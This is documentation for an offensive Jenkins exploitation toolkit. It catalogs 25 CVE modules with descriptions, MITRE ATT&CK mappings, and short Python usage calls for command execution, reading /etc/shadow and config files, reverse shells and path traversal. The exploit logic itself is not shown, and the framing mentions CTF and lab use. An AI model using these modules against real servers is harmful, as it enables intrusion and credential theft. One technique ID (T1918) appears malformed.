# JenkinsBreaker Exploit Modules

This document provides comprehensive documentation for all CVE exploit modules included in JenkinsBreaker.

## Module Overview

JenkinsBreaker includes **25 exploit modules** targeting various Jenkins vulnerabilities spanning from 2016 to 2025.

### Severity Distribution

- **Critical**: 11 modules
- **High**: 11 modules  
- **Medium**: 3 modules

### MITRE ATT&CK Coverage

All modules are mapped to relevant MITRE ATT&CK techniques including:
- T1190 (Exploit Public-Facing Application)
- T1059.006 (Command and Scripting Interpreter: Groovy)
- T1552.001 (Unsecured Credentials: Credentials In Files)
- T1068 (Exploitation for Privilege Escalation)
- T1105 (Ingress Tool Transfer)

---

## Critical Severity Modules

### CVE-2016-0792: XStream Deserialization RCE

**Affected Versions**: Jenkins < 1.650, LTS < 1.642.2

**Description**: Remote code execution via unsafe XStream deserialization of Groovy Expando objects. This vulnerability allows authenticated attackers to execute arbitrary commands by injecting malicious XML payloads.

**MITRE ATT&CK**: T1190, T1059.006, T1203

**References**:
- https://www.jenkins.io/security/advisory/2016-02-24/
- https://nvd.nist.gov/vuln/detail/CVE-2016-0792
- https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_xstream_deserialize

**Usage**:
```python
from jenkins_breaker.modules import exploit_registry

exploit = exploit_registry.get('CVE-2016-0792')
result = exploit.run(session, command='id')
```

---

### CVE-2017-1000353: CLI Java Deserialization RCE

**Affected Versions**: Jenkins < 2.54, LTS < 2.46.1

**Description**: Remote code execution via Jenkins CLI Java deserialization vulnerability. Allows unauthenticated remote code execution.

**MITRE ATT&CK**: T1190, T1203, T1059.006

**References**:
- https://jenkins.io/security/advisory/2017-04-26/
- https://nvd.nist.gov/vuln/detail/CVE-2017-1000353

**Usage**:
```python
result = exploit.run(session, lhost='10.10.14.5', lport=4444)
```

---

### CVE-2018-1000861: Stapler ACL Bypass and RCE

**Affected Versions**: Jenkins <= 2.153, LTS <= 2.138.3

**Description**: ACL bypass via Stapler web framework allowing unauthenticated access to sensitive endpoints and potential RCE.

**MITRE ATT&CK**: T1190, T1068, T1059.006

**References**:
- https://jenkins.io/security/advisory/2018-12-05/
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000861

---

### CVE-2019-1003029: Script Security Sandbox Bypass

**Affected Versions**: Script Security Plugin <= 1.50

**Description**: Sandbox bypass in Script Security plugin allowing arbitrary Groovy code execution.

**MITRE ATT&CK**: T1190, T1059.006, T1068

**References**:
- https://jenkins.io/security/advisory/2019-01-28/
- https://nvd.nist.gov/vuln/detail/CVE-2019-1003029

---

### CVE-2019-1003040: Script Security Constructor Bypass

**Affected Versions**: Script Security Plugin <= 1.54

**Description**: Constructor-based sandbox bypass allowing arbitrary code execution via crafted constructors.

**MITRE ATT&CK**: T1190, T1059.006, T1068

**References**:
- https://jenkins.io/security/advisory/2019-03-06/
- https://nvd.nist.gov/vuln/detail/CVE-2019-1003040

---

### CVE-2022-43401: Pipeline Groovy Sandbox Bypass

**Affected Versions**: Pipeline: Groovy Plugin <= 2689.v434009a_31b_f1, Script Security Plugin <= 1175.v4b_d517d6db_f0

**Description**: Sandbox bypass allowing arbitrary Groovy code execution and file read via implicit casts. Attackers with Pipeline execution permissions can read any file on the Jenkins controller filesystem.

**MITRE ATT&CK**: T1059.006, T1190, T1552.001

**References**:
- https://www.jenkins.io/security/advisory/2022-10-19/
- https://cloudbees.com/security-advisories/cloudbees-security-advisory-2022-10-19
- https://nvd.nist.gov/vuln/detail/CVE-2022-43401

**Usage**:
```python
result = exploit.run(session, file_path='/etc/passwd')
# Or execute custom Groovy code
result = exploit.run(session, command='println "pwned".execute().text')
```

---

### CVE-2023-3519: Citrix NetScaler RCE

**Affected Versions**: N/A (Not Jenkins-specific)

**Description**: Remote code execution in Citrix NetScaler (included for CTF scenarios).

**MITRE ATT&CK**: T1190, T1059

---

### CVE-2024-23897: CLI Arbitrary File Read

**Affected Versions**: Jenkins <= 2.441, LTS <= 2.426.2

**Description**: Arbitrary file read via Jenkins CLI @file syntax. Allows unauthenticated attackers to read files from the Jenkins controller.

**MITRE ATT&CK**: T1190, T1552.001

**References**:
- https://www.jenkins.io/security/advisory/2024-01-24/
- https://nvd.nist.gov/vuln/detail/CVE-2024-23897

**Usage**:
```python
result = exploit.run(session, file_path='/var/lib/jenkins/config.xml')
```

---

### CVE-2024-34144: Script Security Sandbox Bypass

**Affected Versions**: Script Security Plugin <= 1335.vf07d9ce377a_e

**Description**: Critical sandbox bypass via crafted constructor bodies allowing arbitrary code execution. Attackers with permission to run sandboxed scripts can execute any code.

**MITRE ATT&CK**: T1059.006, T1190, T1068

**References**:
- https://www.jenkins.io/security/advisory/2024-05-02/
- https://nvd.nist.gov/vuln/detail/CVE-2024-34144
- https://www.wiz.io/vulnerability-database/cve/cve-2024-34144

**Usage**:
```python
result = exploit.run(session, command='id')
# Or for reverse shell
result = exploit.run(session, lhost='10.10.14.5', lport=4444)
```

---

### CVE-2024-43044: Agent Arbitrary File Read to RCE

**Affected Versions**: Jenkins <= 2.470, LTS <= 2.452.3

**Description**: Critical arbitrary file read via agent connections that can lead to remote code execution.

**MITRE ATT&CK**: T1190, T1552.001, T1059

**References**:
- https://jenkins.io/security/advisory/2024-08-07/
- https://nvd.nist.gov/vuln/detail/CVE-2024-43044

---

### CVE-2025-31722: Templating Engine Plugin RCE

**Affected Versions**: Jenkins Templating Engine Plugin (recent)

**Description**: Remote code execution in Jenkins Templating Engine Plugin.

**MITRE ATT&CK**: T1190, T1059.006

---

## High Severity Modules

### CVE-2018-1000600: GitHub Plugin Arbitrary File Read

**Affected Versions**: GitHub Plugin <= 1.29.1

**Description**: SSRF and arbitrary file read vulnerability in GitHub Plugin.

**MITRE ATT&CK**: T1190, T1552.001, T1918

**References**:
- https://jenkins.io/security/advisory/2018-06-25/
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000600

---

### CVE-2019-1003000: Script Security AST Transformation Bypass

**Affected Versions**: Script Security Plugin <= 1.49

**Description**: Sandbox bypass via AST transformations.

**MITRE ATT&CK**: T1190, T1059.006

---

### CVE-2019-1003001: Pipeline Groovy Plugin Sandbox Bypass

**Affected Versions**: Pipeline: Groovy Plugin <= 2.61

**Description**: Sandbox bypass in Pipeline Groovy plugin.

**MITRE ATT&CK**: T1190, T1059.006, T1068

**References**:
- https://jenkins.io/security/advisory/2019-01-08/
- https://nvd.nist.gov/vuln/detail/CVE-2019-1003001

---

### CVE-2021-21602: Arbitrary File Read via Workspace Browser

**Affected Versions**: Jenkins <= 2.274, LTS <= 2.263.1

**Description**: Path traversal vulnerability in workspace file browsing allowing arbitrary file read on the Jenkins controller.

**MITRE ATT&CK**: T1190, T1552.001, T1083

**References**:
- https://www.jenkins.io/security/advisory/2021-01-13/
- https://nvd.nist.gov/vuln/detail/CVE-2021-21602

**Usage**:
```python
result = exploit.run(session, file_path='/etc/passwd')
# Or specify a job to use
result = exploit.run(session, file_path='/etc/shadow', job_name='my-job')
```

---

### CVE-2021-21686: Agent-to-Controller Path Traversal

**Affected Versions**: Jenkins <= 2.318, LTS <= 2.303.2

**Description**: Path traversal from agent to controller allowing file access.

**MITRE ATT&CK**: T1190, T1083, T1105

**References**:
- https://jenkins.io/security/advisory/2021-11-04/
- https://nvd.nist.gov/vuln/detail/CVE-2021-21686

---

### CVE-2022-30945: Pipeline Groovy OS Command Injection

**Affected Versions**: Pipeline: Groovy Plugin <= 2689.v434009a_31b_f1

**Description**: OS command injection via arbitrary Groovy file loading on classpath. Allows sandbox bypass and command execution.

**MITRE ATT&CK**: T1059.006, T1190, T1059.004

**References**:
- https://www.jenkins.io/security/advisory/2022-05-17/
- https://nvd.nist.gov/vuln/detail/CVE-2022-30945

**Usage**:
```python
result = exploit.run(session, command='cat /etc/passwd')
# Or reverse shell
result = exploit.run(session, lhost='10.10.14.5', lport=4444)
```

---

### CVE-2022-34177: Pipeline Input Step Path Traversal

**Affected Versions**: Pipeline: Input Step Plugin <= 448.v37cea_9a_10a_70

**Description**: Path traversal vulnerability allowing arbitrary file write via file upload parameters in Pipeline Input Step.

**MITRE ATT&CK**: T1190, T1105, T1574.010

**References**:
- https://www.jenkins.io/security/advisory/2022-06-22/
- https://nvd.nist.gov/vuln/detail/CVE-2022-34177

**Usage**:
```python
result = exploit.run(session, target_path='../../../../tmp/malicious.txt', content='payload')
```

---

### CVE-2023-24422: Script Security Plugin Sandbox Bypass

**Affected Versions**: Script Security Plugin <= 1228.vd93135a_2fb_25

**Description**: Sandbox bypass in Script Security plugin.

**MITRE ATT&CK**: T1190, T1059.006

**References**:
- https://jenkins.io/security/advisory/2023-01-24/
- https://nvd.nist.gov/vuln/detail/CVE-2023-24422

---

### CVE-2023-27903: Credential Exposure via Webhook

**Affected Versions**: Jenkins <= 2.393, LTS <= 2.375.3

**Description**: Exposure of stored credentials through crafted webhook requests. Allows attackers to extract sensitive credentials via malicious webhooks.

**MITRE ATT&CK**: T1190, T1552.001, T1213

**References**:
- https://www.jenkins.io/security/advisory/2023-03-08/
- https://www.cisa.gov/news-events/bulletins/sb23-079
- https://nvd.nist.gov/vuln/detail/CVE-2023-27903

**Usage**:
```python
result = exploit.run(session, repository_url='https://github.com/test/repo.git')
```

---

## Medium Severity Modules

### CVE-2018-1000402: AWS CodeDeploy Environment Variable Exposure

**Affected Versions**: AWS CodeDeploy Plugin <= 1.19

**Description**: Environment variable exposure in AWS CodeDeploy plugin revealing credentials.

**MITRE ATT&CK**: T1552.001, T1213

**References**:
- https://jenkins.io/security/advisory/2018-09-25/
- https://nvd.nist.gov/vuln/detail/CVE-2018-1000402

---

### CVE-2019-10358: Maven Plugin Sensitive Info Disclosure

**Affected Versions**: Maven Plugin <= 3.3

**Description**: Information disclosure in Maven Plugin exposing sensitive data.

**MITRE ATT&CK**: T1213, T1552.001

**References**:
- https://jenkins.io/security/advisory/2019-07-17/
- https://nvd.nist.gov/vuln/detail/CVE-2019-10358

---

### CVE-2020-2100: UDP Amplification Reflection Attack

**Affected Versions**: Jenkins <= 2.218, LTS <= 2.204.1

**Description**: UDP-based amplification reflection attack vector.

**MITRE ATT&CK**: T1498.002

**References**:
- https://jenkins.io/security/advisory/2020-01-29/
- https://nvd.nist.gov/vuln/detail/CVE-2020-2100

---

### CVE-2020-2249: TFS Plugin Credential Exposure

**Affected Versions**: TFS Plugin <= 5.157.1

**Description**: Credential exposure in Team Foundation Server plugin.

**MITRE ATT&CK**: T1552.001, T1213

**References**:
- https://jenkins.io/security/advisory/2020-09-01/
- https://nvd.nist.gov/vuln/detail/CVE-2020-2249

---

### CVE-2024-47803: Multi-Line Secret Exposure

**Affected Versions**: Jenkins <= 2.478, LTS <= 2.462.2

**Description**: Exposure of multi-line secret values in error messages for secretTextarea form fields. Allows authenticated attackers to view secrets in validation error messages.

**MITRE ATT&CK**: T1190, T1552.001, T1213

**References**:
- https://www.jenkins.io/security/advisory/2024-10-02/
- https://nvd.nist.gov/vuln/detail/CVE-2024-47803

**Usage**:
```python
result = exploit.run(session)
# Or target specific credential
result = exploit.run(session, credential_id='my-secret-id')
```

---

## Module Development Guidelines

### Creating a New Module

All exploit modules must:

1. Inherit from `ExploitModule`
2. Define `CVE_ID` and `METADATA` class attributes
3. Implement `run()` method
4. Optionally implement `check_vulnerable()` and `cleanup()`

### Example Module Structure

```python
from jenkins_breaker.modules.base import ExploitModule, ExploitMetadata, ExploitResult
from typing import Any

class CVE_YYYY_XXXXX(ExploitModule):
    CVE_ID = "CVE-YYYY-XXXXX"
    
    METADATA = ExploitMetadata(
        cve_id="CVE-YYYY-XXXXX",
        name="Descriptive Name",
        description="Brief description",
        affected_versions=["< X.XXX"],
        mitre_attack=["T1190"],
        severity="critical",
        references=["https://nvd.nist.gov/vuln/detail/CVE-YYYY-XXXXX"],
        requires_auth=True,
        requires_crumb=False,
    )
    
    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        # Optional vulnerability check
        return True
    
    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        # Exploit implementation
        try:
            # Exploitation logic
            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details="Exploitation successful"
            )
        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )
```

### Testing Modules

All modules should be tested against the jenkins-lab Docker environment at `http://localhost:8080` (credentials: admin/admin).

```bash
# Start jenkins-lab
docker-compose -f jenkins-lab/docker-compose.yml up -d

# Test module
python -m jenkins_breaker exploit CVE-YYYY-XXXXX --target http://localhost:8080 --username admin --password admin
```

---

## References

- [Jenkins Security Advisories](https://www.jenkins.io/security/advisories/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [National Vulnerability Database](https://nvd.nist.gov/)
